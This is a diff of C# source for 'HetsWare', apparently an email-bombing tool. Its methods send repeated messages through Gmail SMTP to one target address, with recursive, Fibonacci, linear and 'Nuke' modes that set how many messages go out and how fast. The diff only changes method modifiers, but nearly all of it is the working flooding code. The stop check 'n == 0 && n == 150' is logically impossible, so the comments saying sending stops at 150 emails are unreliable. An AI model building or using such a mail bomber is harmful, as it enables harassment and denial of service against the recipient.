@@ -89,7 +89,7 @@ namespace HetsWare
         /// <param name="TargetMail">Recipient e-mail</param>
         /// <param name="MailTitle">E-mail Title</param>
         /// <param name="MailBody">E-mail body</param>
-        static void DeployHetsWare(string SourceMail, string Password, string TargetMail, string MailTitle, string MailBody) {
+        private void DeployHetsWare(string SourceMail, string Password, string TargetMail, string MailTitle, string MailBody) {
             var client = new SmtpClient("smtp.gmail.com", 587) {
                 Credentials = new NetworkCredential(SourceMail, Password),
                 EnableSsl = true               
@@ -104,7 +104,7 @@ namespace HetsWare
         //
         //HetsMode Methods:
         //
-        static int DefaultRecursion(int n, string SourceMail, string Password, string TargetMail, string MailTitle, string MailBody) {
+        private int DefaultRecursion(int n, string SourceMail, string Password, string TargetMail, string MailTitle, string MailBody) {
             if (n == 0 && n == 150) //<---stops sending when 150 e-mails are reached.
                 return 1;
             for (int i = 0; i < n; i++) {
@@ -116,7 +116,7 @@ namespace HetsWare
             Thread.Sleep(timeout);
             return DefaultRecursion(n + 1, SourceMail, Password, TargetMail, MailTitle, MailBody);
         }
-        static void Fibonacci(int a, int b, int counter, int maxNumber, string SourceMail, string Password, string TargetMail, string MailTitle, string MailBody) {
+        private void Fibonacci(int a, int b, int counter, int maxNumber, string SourceMail, string Password, string TargetMail, string MailTitle, string MailBody) {
             //Use 1, 1, 1, 12 because 12th call = 144 e-mails.
             for (int i = 0; i < a; i++) {
                 DeployHetsWare(SourceMail, Password, TargetMail, MailTitle, MailBody);
@@ -127,7 +127,7 @@ namespace HetsWare
             Thread.Sleep(timeout);
             if (counter < maxNumber) Fibonacci(b, a + b, counter + 1, maxNumber, SourceMail, Password, TargetMail, MailTitle, MailBody);
         }
-        static int Linear(int n, string SourceMail, string Password, string TargetMail, string MailTitle, string MailBody) {
+        private int Linear(int n, string SourceMail, string Password, string TargetMail, string MailTitle, string MailBody) {
             if (n == 0 && n == 150)//<---stops sending when 150 e-mails are reached.
                 return 1;
             for (int i = 0; i < n; i++) {
@@ -137,7 +137,7 @@ namespace HetsWare
             Thread.Sleep(timeout);
             return Linear(n + n, SourceMail, Password, TargetMail, MailTitle, MailBody);
         }
-        static void Nuke(string SourceMail, string Password, string TargetMail, string MailTitle, string MailBody) {
+        private void Nuke(string SourceMail, string Password, string TargetMail, string MailTitle, string MailBody) {
             for (int i = 0; i < 150; i++) {                
                 DeployHetsWare(SourceMail, Password, TargetMail, MailTitle, MailBody);
                 TimeSpan interval = TimeSpan.FromSeconds(2); //<--- 60 mails per minute, rememeber?
